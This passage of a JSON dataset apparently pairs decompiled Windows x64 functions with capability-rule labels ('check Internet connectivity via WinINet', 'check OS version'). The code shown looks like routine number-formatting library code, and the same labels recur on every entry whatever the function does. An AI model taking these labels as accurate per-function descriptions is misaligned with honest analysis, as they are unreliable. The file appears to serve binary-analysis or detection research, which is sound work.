&stack0xffffffffffffff08;\n        if (0x35 < iVar2) {\n            uStack320 = 0x14005e5ac;\n            iVar3 = fcn.1400147b0(puVar8);\n            iVar3 = -iVar3;\n            puVar10 = &stack0xfffffffffffffec8 + iVar3;\n            *(&stack0xfffffffffffffec0 + iVar3) = 0x14005e5b4;\n            var_58h = fcn.1400a5680();\n            piVar13 = &stack0xffffffffffffff08 + iVar3;\n            _auStack120 = auStack152._0_10_;\n            *(&stack0xfffffffffffffef0 + iVar3) = &stack0xffffffffffffff88;\n            *(&stack0xfffffffffffffee8 + iVar3) = puVar14;\n            puVar8 = puStack176;\n            *(&stack0xfffffffffffffec0 + iVar3) = 0x14005e5df;\n            var_5ch = fcn.1400b66d0(puVar8, piVar13, iVar2 + 1, &fcn.14005e3b0::var_50h_2);\n        }\n    }\n    iVar2 = var_5ch;\n    iVar16 = var_5ch;\n    *(puVar10 + -8) = 0x14005e49f;\n    arg1_00 = fcn.1400b97f0(piVar7);\n    *(puVar10 + -8) = 0x14005e4af;\n    iVar3 = fcn.1400147b0(piVar7);\n    iVar3 = -iVar3;\n    puVar11 = puVar10 + iVar3;\n    puVar12 = puVar10 + iVar3;\n    auStack152._0_8_ = piVar13 + iVar16;\n    piVar15 = puVar10 + iVar3 + 0x40;\n    if (*(arg1_00 + 7) == '\\x01') {\ncode_r0x00014005e4e6:\n        arg1_00 = piVar7;\n        if (auStack152._0_8_ != piVar13) {\n            *(puVar10 + iVar3 + -8) = 0x14005e4f9;\n            arg1_00 = piVar15;\n            sub.msvcrt.dll_memcpy(piVar15, piVar13, iVar16);\n        }\n    }\n    else {\n        if (*(arg1_00 + 7) == '\\0') {\n            *(puVar10 + iVar3 + -8) = 0x14005e76c;\n            piVar7 = arg1_00;\n            fcn.14002b2c0(arg1_00);\n        }\n        pcVar1 = *(*arg1_00 + 0x38);\n        if (pcVar1 == 0x14002ba80) goto code_r0x00014005e4e6;\n        *(puVar10 + iVar3 + -8) = 0x14005e7db;\n        (*pcVar1)();\n    }\n    if (iVar16 == 0) {\n        if (*(piStack136 + 4) == '\\0') goto code_r0x00014005e538;\n        pcVar4 = NULL;\ncode_r0x00014005e600:\n        *(puVar10 + iVar3 + -8) = 0x14005e60e;\n        iVar16 = fcn.1400147b0(arg1_00);\n        iVar16 = -iVar16;\n        puVar12 = puVar10 + iVar16 + iVar3;\n        puVar11 = puVar10 + iVar16 + iVar3;\n        piVar7 = puVar10 + iVar16 + iVar3 + 0x40;\n        bVar17 = (*piVar13 - 0x2bU & 0xfd) == 0;\n        piVar13 = piVar7;\n        if (bVar17) {\n            cVar9 = *piVar15;\n            piVar15 = puVar10 + iVar3 + 0x41;\n            var_5ch = iVar2 + -1;\n            *piVar7 = cVar9;\n            piVar13 = puVar10 + iVar16 + iVar3 + 0x41;\n        }\n        iVar5 = piStack136[3];\n        arg2_00 = piStack136[2];\n        *(puVar10 + iVar16 + iVar3 + 0x30) = piVar15;\n        *(puVar10 + iVar16 + iVar3 + 0x20) = pcVar4;\n        *(puVar10 + iVar16 + iVar3 + 0x38) = &stack0xffffffffffffff9c;\n        *(puVar10 + iVar16 + iVar3 + 0x28) = piVar13;\n        *(puVar10 + iVar16 + iVar3 + -8) = 0x14005e678;\n        fcn.14005ded0(arg2, arg2_00, iVar5);\n        var_5ch = bVar17 + var_5ch;\n        iVar3 = *(arg4 + 0x10);\n        iVar16 = var_5ch;\n        if (iVar3 <= iVar16) goto code_r0x00014005e545;\n    }\n    else {\n        *(puVar10 + iVar3 + -8) = 0x14005e512;\n        arg1_00 = piVar13;\n        pcVar4 = sub.msvcrt.dll_memchr(piVar13, 0x2e, iVar16);\n        piVar7 = piStack136;\n        if (pcVar4 != NULL) {\n            pcVar4 = (pcVar4 - piVar13) + piVar15;\n            *pcVar4 = *(piStack136 + 9);\n            arg1_00 = piVar7;\n            if (*(piVar7 + 4) == '\\0') goto code_r0x00014005e538;\n            goto code_r0x00014005e600;\n        }\n        if ((*(piStack136 + 4) != '\\0') &&\n           ((iVar2 < 3 ||\n            (((*(piVar13 + 1) < ':' && (uVar6 = *(piVar13 + 2) - 0x30,  arg1_00 = uVar6,  uVar6 < 10)) &&\n             ('/' < *(piVar13 + 1))))))) goto code_r0x00014005e600;\ncode_r0x00014005e538:\n        iVar3 = *(arg4 + 0x10);\n        arg2 = arg1_00;\n        piVar7 = piVar15;\n        if (iVar3 <= iVar16) goto code_r0x00014005e545;\n    }\n    *(puVar12 + -8) = 0x14005e69d;\n    iVar5 = fcn.1400147b0(arg2);\n    iVar5 = -iVar5;\n    puVar11 = puVar12 + iVar5;\n    *(puVar12 + iVar5 + 0x28) = iVar16;\n    iVar16 = iVar3;\n    *(puVar12 + iVar5 + 0x20) = iVar3;\n    *(puVar12 + iVar5 + -8) = 0x14005e6c7;\n    fcn.1400a2100(arg4, uStack164, puVar12 + iVar5 + 0x40, piVar7);\n    var_5ch = iVar3;\n    piVar7 = puVar12 + iVar5 + 0x40;\ncode_r0x00014005e545:\n    piVar13 = piStack128;\n    *(arg4 + 0x10) = 0;\n    cVar9 = piStack160;\n    if (cVar9 == '\\0') {\n        pcVar1 = *(*piStack128 + 0x60);\n        *(puVar11 + -8) = 0x14005e567;\n        iVar3 = (*pcVar1)(piVar13, piVar7, iVar16);\n        if (iVar3 != iVar16) {\n            cVar9 = '\\x01';\n        }\n    }\n    *arg1 = piStack128;\n    *(arg1 + 1) = cVar9;\n    return;\n}\n",
        "token_count": 3124
    },
    "14005f08": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t **\nfcn.14005f080(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t arg4, ulong noname_4, ulong noname_5, \n             ulong noname_6, ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n             ulong arg_70h, ulong arg_78h)\n\n{\n    uint16_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    code *pcVar4;\n    ulong arg3_00;\n    ulong arg4_00;\n    int32_t iVar5;\n    int64_t iVar6;\n    ushort *arg1_00;\n    uint64_t arg2;\n    ushort *arg4_01;\n    ushort *puVar7;\n    char cVar8;\n    uchar *puVar9;\n    uchar *puVar10;\n    int64_t iVar11;\n    int64_t iVar12;\n    bool bVar13;\n    bool bVar14;\n    ulong var_8h_2;\n    ulong uStack208;\n    uchar auStack200 [32];\n    uint32_t uStack168;\n    int64_t iStack160;\n    ushort auStack152 [2];\n    ushort auStack148 [18];\n    ushort auStack112 [6];\n    uint32_t uStack100;\n    ushort *puStack96;\n    int64_t iStack88;\n    uint uStack80;\n    uint32_t uStack76;\n    ulong var_1ch;\n    ulong var_10h;\n    ulong var_8h;\n    \n    puStack96 = &stack0xffffffffffffff68;\n    piVar2 = *arg3;\n    piVar3 = arg3[1];\n    uStack80 = noname_4;\n    iStack160 = 0x14005f0b8;\n    iVar6 = fcn.140026f80(arg4 + 0xd0);\n    puVar9 = &stack0xffffffffffffff38;\n    puVar10 = &stack0xffffffffffffff38;\n    arg2 = noname_5;\n    iStack88 = iVar6 + 0x4c;\n    uStack76 = *(arg4 + 0x18);\n    uStack100 = uStack76 & 0x4a;\n    bVar13 = uStack100 != 0x40;\n    bVar14 = uStack100 != 8;\n    if ((noname_5 < 1) && (arg2 = -noname_5,  !bVar13 || !bVar14)) {\n        arg2 = noname_5;\n    }\n    arg1_00 = &stack0xffffffffffffff90;\n    uStack168 = bVar13 && bVar14;\n    uStack208 = 0x14005f116;\n    iVar5 = fcn.1400b5f10(arg1_00, arg2, iStack88, uStack76);\n    iVar12 = iVar5;\n    puVar7 = puStack96 + (0x14 - iVar5);\n    if (*(iVar6 + 0x20) == '\\0') {\n        if (bVar13 && bVar14) goto code_r0x00014005f13e;\ncode_r0x00014005f27a:\n        arg4_01 = puVar7;\n        if (((uStack76 & 0x200) != 0) && (noname_5 != 0)) {\n            if (uStack100 == 0x40) {\n                iVar5 = iVar5 + 1;\n                arg4_01 = puVar7 + -1;\n                *arg4_01 = *(iVar6 + 0x54);\n            }\n            else {\n                iVar5 = iVar5 + 2;\n                arg4_01 = puVar7 + -2;\n                puVar7[-1] = *(iStack88 + 4 + (uStack76 >> 0xe & 1) * 2);\n                *arg4_01 = *(iVar6 + 0x54);\n            }\n        }\ncode_r0x00014005f150:\n        iVar12 = *(arg4 + 0x10);\n        iVar11 = iVar5;\n        puVar9 = puVar10;\n        if (iVar12 <= iVar11) goto code_r0x00014005f15c;\n    }\n    else {\n        uStack208 = 0x14005f22f;\n        iVar11 = fcn.1400147b0(arg1_00);\n        arg3_00 = *(iVar6 + 0x10);\n        uVar1 = *(iVar6 + 0x4a);\n        arg4_00 = *(iVar6 + 0x18);\n        iVar11 = -iVar11;\n        puVar9 = &stack0xffffffffffffff38 + iVar11;\n        puVar10 = &stack0xffffffffffffff38 + iVar11;\n        *(&stack0xffffffffffffff58 + iVar11) = puVar7;\n        *(&stack0xffffffffffffff60 + iVar11) = puVar7 + iVar12;\n        puStack96 = &stack0xffffffffffffff6c + iVar11;\n        *(&stack0xffffffffffffff30 + iVar11) = 0x14005f261;\n        iVar12 = fcn.1400b6270(&stack0xffffffffffffff6c + iVar11, uVar1, arg3_00, arg4_00);\n        iVar5 = iVar12 - puStack96 >> 1;\n        arg1_00 = puStack96;\n        puVar7 = puStack96;\n        if (!bVar13 || !bVar14) goto code_r0x00014005f27a;\ncode_r0x00014005f13e:\n        puVar10 = puVar9;\n        if (noname_5 < 0) {\n            iVar5 = iVar5 + 1;\n            puVar7[-1] = *(iVar6 + 0x4c);\n            arg4_01 = puVar7 + -1;\n            goto code_r0x00014005f150;\n        }\n        arg4_01 = puVar7;\n        if ((uStack76 & 0x800) == 0) goto code_r0x00014005f150;\n        iVar12 = *(arg4 + 0x10);\n        arg4_01 = puVar7 + -1;\n        iVar11 = iVar5 + 1;\n        *arg4_01 = *(iVar6 + 0x4e);\n        if (iVar12 <= iVar11) goto code_r0x00014005f15c;\n    }\n    *(puVar9 + -8) = 0x14005f1c9;\n    iVar6 = fcn.1400147b0(arg1_00);\n    iVar6 = -iVar6;\n    *(puVar9 + iVar6 + 0x28) = iVar11;\n    iVar11 = iVar12;\n    *(puVar9 + iVar6 + 0x20) = iVar12;\n    *(puVar9 + iVar6 + -8) = 0x14005f1f2;\n    fcn.1400a23f0(arg4, uStack80, puVar9 + iVar6 + 0x30, arg4_01);\n    arg4_01 = puVar9 + iVar6 + 0x30;\n    puVar9 = puVar9 + iVar6;\ncode_r0x00014005f15c:\n    *(arg4 + 0x10) = 0;\n    cVar8 = piVar3;\n    if (cVar8 == '\\0') {\n        pcVar4 = *(*piVar2 + 0x60);\n        *(puVar9 + -8) = 0x14005f178;\n        iVar6 = (*pcVar4)(piVar2, arg4_01, iVar11);\n        if (iVar11 != iVar6) {\n            cVar8 = '\\x01';\n        }\n    }\n    *arg1 = piVar2;\n    *(arg1 + 1) = cVar8;\n    return arg1;\n}\n",
        "token_count": 1824
    },
    "14005f2e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t **\nfcn.14005f2e0(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t arg4, ulong noname_4, ulong noname_5, \n             ulong noname_6, ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n             ulong arg_70h, ulong arg_78h)\n\n{\n    int64_t *piVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int64_t *piVar4;\n    int64_t *piVar5;\n    code *pcVar6;\n    ulong arg4_00;\n    ulong arg3_00;\n    int32_t iVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    ulong *arg1_00;\n    ushort *arg1_01;\n    ushort *puVar11;\n    ushort *arg4_01;\n    char cVar12;\n    uchar *puVar13;\n    uchar *puVar14;\n    bool bVar15;\n    uint32_t uVar16;\n    ulong var_8h_2;\n    ulong uStack208;\n    uchar auStack200 [32];\n    uint32_t uStack168;\n    int64_t iStack160;\n    uchar auStack152 [4];\n    ushort auStack148 [18];\n    ushort auStack112 [4];\n    int64_t iStack104;\n    uint uStack92;\n    uchar *puStack88;\n    ushort *puStack80;\n    ulong var_20h;\n    ulong var_14h;\n    ulong var_8h;\n    \n    puStack88 = &stack0xffffffffffffff68;\n    piVar4 = *arg3;\n    piVar5 = arg3[1];\n    uStack92 = noname_4;\n    iStack160 = 0x14005f314;\n    iVar8 = fcn.14002c080(0x1401089d0);\n    piVar1 = *(*(arg4 + 0xd0) + 0x18) + iVar8 * 8;\n    iVar9 = *piVar1;\n    if (iVar9 == 0) {\n        iStack160 = 0x14005f50a;\n        arg1_00 = fcn.1400bc710(0xd0);\n        *(arg1_00 + 1) = 0;\n        *arg1_00 = 0x140118600;\n        arg1_00[2] = 0;\n        arg1_00[3] = 0;\n        *(arg1_00 + 4) = 0;\n        arg1_00[5] = 0;\n        arg1_00[6] = 0;\n        arg1_00[7] = 0;\n        arg1_00[8] = 0;\n        *(arg1_00 + 9) = 0;\n        *(arg1_00 + 0x19) = 0;\n        iStack160 = 0x14005f56f;\n        fcn.14009df10(arg1_00, arg4 + 0xd0);\n        iStack160 = 0x14005f581;\n        fcn.1400a38f0(*(arg4 + 0xd0), arg1_00, iVar8);\n        iVar9 = *piVar1;\n    }\n    uVar3 = *(arg4 + 0x18);\n    puVar13 = &stack0xffffffffffffff38;\n    puVar14 = &stack0xffffffffffffff38;\n    iStack104 = iVar9 + 0x4c;\n    arg1_01 = &stack0xffffffffffffff90;\n    uVar16 = uVar3 & 0x4a;\n    bVar15 = uVar16 != 0x40 && uVar16 != 8;\n    puStack80 = puStack80 & 0xffffffffffffff00 | bVar15;\n    uStack168 = bVar15;\n    uStack208 = 0x14005f380;\n    iVar7 = fcn.1400b5f10(arg1_01, noname_5, iStack104, uVar3);\n    iVar8 = iVar7;\n    puVar11 = puStack88 + (0x14 - iVar7) * 2;\n    puStack88._0_1_ = puStack80;\n    if (*(iVar9 + 0x20) != '\\0') {\n        puStack88 = puStack88 & 0xffffffffffffff00 | puStack80 & 0xff;\n        uStack208 = 0x14005f41b;\n        iVar10 = fcn.1400147b0(arg1_01);\n        uVar2 = *(iVar9 + 0x4a);\n        arg4_00 = *(iVar9 + 0x18);\n        iVar10 = -iVar10;\n        puVar13 = &stack0xffffffffffffff38 + iVar10;\n        puVar14 = &stack0xffffffffffffff38 + iVar10;\n        arg3_00 = *(iVar9 + 0x10);\n        *(&stack0xffffffffffffff60 + iVar10) = puVar11 + iVar8;\n        *(&stack0xffffffffffffff58 + iVar10) = puVar11;\n        puStack80 = &stack0xffffffffffffff6c + iVar10;\n        *(&stack0xffffffffffffff30 + iVar10) = 0x14005f44d;\n        iVar8 = fcn.1400b6270(&stack0xffffffffffffff6c + iVar10, uVar2, arg3_00, arg4_00);\n        iVar7 = iVar8 - puStack80 >> 1;\n        puVar11 = puStack80;\n        arg1_01 = puStack80;\n    }\n    arg4_01 = puVar11;\n    if (((puStack88 == '\\0') && (puVar13 = puVar14,  (uVar3 & 0x200) != 0)) && (noname_5 != 0)) {\n        if (uVar16 == 0x40) {\n            iVar7 = iVar7 + 1;\n            arg4_01 = puVar11 + -1;\n            *arg4_01 = *(iVar9 + 0x54);\n        }\n        else {\n            iVar7 = iVar7 + 2;\n            arg4_01 = puVar11 + -2;\n            puVar11[-1] = *(iStack104 + 4 + (uVar3 >> 0xe & 1) * 2);\n            *arg4_01 = *(iVar9 + 0x54);\n        }\n    }\n    iVar9 = *(arg4 + 0x10);\n    iVar8 = iVar7;\n    puVar11 = arg4_01;\n    puVar14 = puVar13;\n    if (iVar8 < iVar9) {\n        *(puVar13 + -8) = 0x14005f4ce;\n        iVar10 = fcn.1400147b0(arg1_01);\n        iVar10 = -iVar10;\n        puVar14 = puVar13 + iVar10;\n        *(puVar13 + iVar10 + 0x28) = iVar8;\n        puVar11 = puVar13 + iVar10 + 0x30;\n        iVar8 = iVar9;\n        *(puVar13 + iVar10 + 0x20) = iVar9;\n        *(puVar13 + iVar10 + -8) = 0x14005f4f7;\n        fcn.1400a23f0(arg4, uStack92, puVar11, arg4_01);\n    }\n    *(arg4 + 0x10) = 0;\n    cVar12 = piVar5;\n    if (cVar12 == '\\0') {\n        pcVar6 = *(*piVar4 + 0x60);\n        *(puVar14 + -8) = 0x14005f3d6;\n        iVar9 = (*pcVar6)(piVar4, puVar11, iVar8);\n        if (iVar8 != iVar9) {\n            cVar12 = '\\x01';\n        }\n    }\n    *arg1 = piVar4;\n    *(arg1 + 1) = cVar12;\n    return arg1;\n}\n",
        "token_count": 1874
    },
    "14005f5d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t **\nfcn.14005f5d0(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t arg4, ulong noname_4, int64_t noname_5, \n             ulong noname_6, ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n             ulong arg_70h, ulong arg_78h)\n\n{\n    uint16_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    code *pcVar4;\n    ulong arg3_00;\n    ulong arg4_00;\n    int32_t iVar5;\n    int64_t iVar6;\n    ushort *arg1_00;\n    ushort *arg4_01;\n    ushort *puVar7;\n    char cVar8;\n    uchar *puVar9;\n    uchar *puVar10;\n    int64_t iVar11;\n    int64_t iVar12;\n    bool bVar13;\n    bool bVar14;\n    ulong var_8h_2;\n    ulong uStack240;\n    uchar auStack232 [32];\n    uint32_t uStack200;\n    int64_t iStack192;\n    ushort auStack184 [2];\n    ushort auStack180 [10];\n    ulong uStack160;\n    ushort auStack104 [2];\n    uint32_t uStack100;\n    ushort *puStack96;\n    int64_t iStack88;\n    uint uStack80;\n    uint32_t uStack76;\n    ulong var_1ch;\n    ulong var_10h;\n    ulong var_8h;\n    \n    piVar2 = *arg3;\n    piVar3 = arg3[1];\n    uStack80 = noname_4;\n    uStack160 = 0x14005f608;\n    iVar6 = fcn.140026f80(arg4 + 0xd0);\n    puVar9 = &stack0xffffffffffffff18;\n    puVar10 = &stack0xffffffffffffff18;\n    iStack88 = iVar6 + 0x4c;\n    puStack96 = &stack0xffffffffffffff48;\n    uStack76 = *(arg4 + 0x18);\n    uStack100 = uStack76 & 0x4a;\n    bVar13 = uStack100 != 0x40;\n    bVar14 = uStack100 != 8;\n    iVar12 = noname_5;\n    if ((noname_5 < 1) && (iVar12 = -noname_5,  !bVar13 || !bVar14)) {\n        iVar12 = noname_5;\n    }\n    arg1_00 = &stack0xffffffffffffff98;\n    uStack200 = bVar13 && bVar14;\n    uStack240 = 0x14005f667;\n    iVar5 = fcn.1400b5fe0(arg1_00, iVar12, iStack88, uStack76);\n    iVar12 = iVar5;\n    puVar7 = puStack96 + (0x28 - iVar5);\n    if (*(iVar6 + 0x20) == '\\0') {\n        if (bVar13 && bVar14) goto code_r0x00014005f68f;\ncode_r0x00014005f7ca:\n        arg4_01 = puVar7;\n        if (((uStack76 & 0x200) != 0) && (noname_5 != 0)) {\n            if (uStack100 == 0x40) {\n                iVar5 = iVar5 + 1;\n                arg4_01 = puVar7 + -1;\n                *arg4_01 = *(iVar6 + 0x54);\n            }\n            else {\n                iVar5 = iVar5 + 2;\n                arg4_01 = puVar7 + -2;\n                puVar7[-1] = *(iStack88 + 4 + (uStack76 >> 0xe & 1) * 2);\n                *arg4_01 = *(iVar6 + 0x54);\n            }\n        }\ncode_r0x00014005f6a1:\n        iVar12 = *(arg4 + 0x10);\n        iVar11 = iVar5;\n        puVar9 = puVar10;\n        if (iVar12 <= iVar11) goto code_r0x00014005f6ad;\n    }\n    else {\n        uStack240 = 0x14005f77f;\n        iVar11 = fcn.1400147b0(arg1_00);\n        arg3_00 = *(iVar6 + 0x10);\n        uVar1 = *(iVar6 + 0x4a);\n        arg4_00 = *(iVar6 + 0x18);\n        iVar11 = -iVar11;\n        puVar9 = &stack0xffffffffffffff18 + iVar11;\n        puVar10 = &stack0xffffffffffffff18 + iVar11;\n        *(&stack0xffffffffffffff38 + iVar11) = puVar7;\n        *(&stack0xffffffffffffff40 + iVar11) = puVar7 + iVar12;\n        puStack96 = &stack0xffffffffffffff4c + iVar11;\n        *(&stack0xffffffffffffff10 + iVar11) = 0x14005f7b1;\n        iVar12 = fcn.1400b6270(&stack0xffffffffffffff4c + iVar11, uVar1, arg3_00, arg4_00);\n        iVar5 = iVar12 - puStack96 >> 1;\n        arg1_00 = puStack96;\n        puVar7 = puStack96;\n        if (!bVar13 || !bVar14) goto code_r0x00014005f7ca;\ncode_r0x00014005f68f:\n        puVar10 = puVar9;\n        if (noname_5 < 0) {\n            iVar5 = iVar5 + 1;\n            puVar7[-1] = *(iVar6 + 0x4c);\n            arg4_01 = puVar7 + -1;\n            goto code_r0x00014005f6a1;\n        }\n        arg4_01 = puVar7;\n        if ((uStack76 & 0x800) == 0) goto code_r0x00014005f6a1;\n        iVar12 = *(arg4 + 0x10);\n        arg4_01 = puVar7 + -1;\n        iVar11 = iVar5 + 1;\n        *arg4_01 = *(iVar6 + 0x4e);\n        if (iVar12 <= iVar11) goto code_r0x00014005f6ad;\n    }\n    *(puVar9 + -8) = 0x14005f719;\n    iVar6 = fcn.1400147b0(arg1_00);\n    iVar6 = -iVar6;\n    *(puVar9 + iVar6 + 0x28) = iVar11;\n    iVar11 = iVar12;\n    *(puVar9 + iVar6 + 0x20) = iVar12;\n    *(puVar9 + iVar6 + -8) = 0x14005f742;\n    fcn.1400a23f0(arg4, uStack80, puVar9 + iVar6 + 0x30, arg4_01);\n    arg4_01 = puVar9 + iVar6 + 0x30;\n    puVar9 = puVar9 + iVar6;\ncode_r0x00014005f6ad:\n    *(arg4 + 0x10) = 0;\n    cVar8 = piVar3;\n    if (cVar8 == '\\0') {\n        pcVar4 = *(*piVar2 + 0x60);\n        *(puVar9 + -8) = 0x14005f6c9;\n        iVar12 = (*pcVar4)(piVar2, arg4_01, iVar11);\n        if (iVar11 != iVar12) {\n            cVar8 = '\\x01';\n        }\n    }\n    *arg1 = piVar2;\n    *(arg1 + 1) = cVar8;\n    return arg1;\n}\n",
        "token_count": 1831
    },
    "14005f83": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t **\nfcn.14005f830(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t arg4, ulong noname_4, int64_t noname_5, \n             ulong noname_6, ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n             ulong arg_70h, ulong arg_78h)\n\n{\n    int64_t *piVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int64_t *piVar4;\n    int64_t *piVar5;\n    code *pcVar6;\n    ulong arg4_00;\n    ulong arg3_00;\n    int32_t iVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    ulong *arg1_00;\n    ushort *arg1_01;\n    ushort *puVar11;\n    ushort *arg4_01;\n    char cVar12;\n    uchar *puVar13;\n    uchar *puVar14;\n    bool bVar15;\n    uint32_t uVar16;\n    ulong var_8h_2;\n    ulong uStack240;\n    uchar auStack232 [32];\n    uint32_t uStack200;\n    int64_t iStack192;\n    uchar auStack184 [4];\n    ushort auStack180 [10];\n    ulong uStack160;\n    int64_t iStack104;\n    uint uStack92;\n    uchar *puStack88;\n    ushort *puStack80;\n    ulong var_20h;\n    ulong var_14h;\n    ulong var_8h;\n    \n    piVar4 = *arg3;\n    piVar5 = arg3[1];\n    uStack92 = noname_4;\n    uStack160 = 0x14005f864;\n    iVar8 = fcn.14002c080(0x1401089d0);\n    piVar1 = *(*(arg4 + 0xd0) + 0x18) + iVar8 * 8;\n    iVar9 = *piVar1;\n    if (iVar9 == 0) {\n        uStack160 = 0x14005fa5a;\n        arg1_00 = fcn.1400bc710(0xd0);\n        *(arg1_00 + 1) = 0;\n        *arg1_00 = 0x140118600;\n        arg1_00[2] = 0;\n        arg1_00[3] = 0;\n        *(arg1_00 + 4) = 0;\n        arg1_00[5] = 0;\n        arg1_00[6] = 0;\n        arg1_00[7] = 0;\n        arg1_00[8] = 0;\n        *(arg1_00 + 9) = 0;\n        *(arg1_00 + 0x19) = 0;\n        uStack160 = 0x14005fabf;\n        fcn.14009df10(arg1_00, arg4 + 0xd0);\n        uStack160 = 0x14005fad1;\n        fcn.1400a38f0(*(arg4 + 0xd0), arg1_00, iVar8);\n        iVar9 = *piVar1;\n    }\n    uVar3 = *(arg4 + 0x18);\n    puVar13 = &stack0xffffffffffffff18;\n    puVar14 = &stack0xffffffffffffff18;\n    iStack104 = iVar9 + 0x4c;\n    puStack88 = &stack0xffffffffffffff48;\n    arg1_01 = &stack0xffffffffffffff98;\n    uVar16 = uVar3 & 0x4a;\n    bVar15 = uVar16 != 0x40 && uVar16 != 8;\n    puStack80 = puStack80 & 0xffffffffffffff00 | bVar15;\n    uStack200 = bVar15;\n    uStack240 = 0x14005f8d4;\n    iVar7 = fcn.1400b5fe0(arg1_01, noname_5, iStack104, uVar3);\n    iVar8 = iVar7;\n    puVar11 = puStack88 + (0x28 - iVar7) * 2;\n    puStack88._0_1_ = puStack80;\n    if (*(iVar9 + 0x20) != '\\0') {\n        puStack88 = puStack88 & 0xffffffffffffff00 | puStack80 & 0xff;\n        uStack240 = 0x14005f96b;\n        iVar10 = fcn.1400147b0(arg1_01);\n        uVar2 = *(iVar9 + 0x4a);\n        arg4_00 = *(iVar9 + 0x18);\n        iVar10 = -iVar10;\n        puVar13 = &stack0xffffffffffffff18 + iVar10;\n        puVar14 = &stack0xffffffffffffff18 + iVar10;\n        arg3_00 = *(iVar9 + 0x10);\n        *(&stack0xffffffffffffff40 + iVar10) = puVar11 + iVar8;\n        *(&stack0xffffffffffffff38 + iVar10) = puVar11;\n        puStack80 = &stack0xffffffffffffff4c + iVar10;\n        *(&stack0xffffffffffffff10 + iVar10) = 0x14005f99d;\n        iVar8 = fcn.1400b6270(&stack0xffffffffffffff4c + iVar10, uVar2, arg3_00, arg4_00);\n        iVar7 = iVar8 - puStack80 >> 1;\n        puVar11 = puStack80;\n        arg1_01 = puStack80;\n    }\n    arg4_01 = puVar11;\n    if (((puStack88 == '\\0') && (puVar13 = puVar14,  (uVar3 & 0x200) != 0)) && (noname_5 != 0)) {\n        if (uVar16 == 0x40) {\n            iVar7 = iVar7 + 1;\n            arg4_01 = puVar11 + -1;\n            *arg4_01 = *(iVar9 + 0x54);\n        }\n        else {\n            iVar7 = iVar7 + 2;\n            arg4_01 = puVar11 + -2;\n            puVar11[-1] = *(iStack104 + 4 + (uVar3 >> 0xe & 1) * 2);\n            *arg4_01 = *(iVar9 + 0x54);\n        }\n    }\n    iVar9 = *(arg4 + 0x10);\n    iVar8 = iVar7;\n    puVar11 = arg4_01;\n    puVar14 = puVar13;\n    if (iVar8 < iVar9) {\n        *(puVar13 + -8) = 0x14005fa1e;\n        iVar10 = fcn.1400147b0(arg1_01);\n        iVar10 = -iVar10;\n        puVar14 = puVar13 + iVar10;\n        *(puVar13 + iVar10 + 0x28) = iVar8;\n        puVar11 = puVar13 + iVar10 + 0x30;\n        iVar8 = iVar9;\n        *(puVar13 + iVar10 + 0x20) = iVar9;\n        *(puVar13 + iVar10 + -8) = 0x14005fa47;\n        fcn.1400a23f0(arg4, uStack92, puVar11, arg4_01);\n    }\n    *(arg4 + 0x10) = 0;\n    cVar12 = piVar5;\n    if (cVar12 == '\\0') {\n        pcVar6 = *(*piVar4 + 0x60);\n        *(puVar14 + -8) = 0x14005f92a;\n        iVar9 = (*pcVar6)(piVar4, puVar11, iVar8);\n        if (iVar8 != iVar9) {\n            cVar12 = '\\x01';\n        }\n    }\n    *arg1 = piVar4;\n    *(arg1 + 1) = cVar12;\n    return arg1;\n}\n",
        "token_count": 1870
    },
    "14005fc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
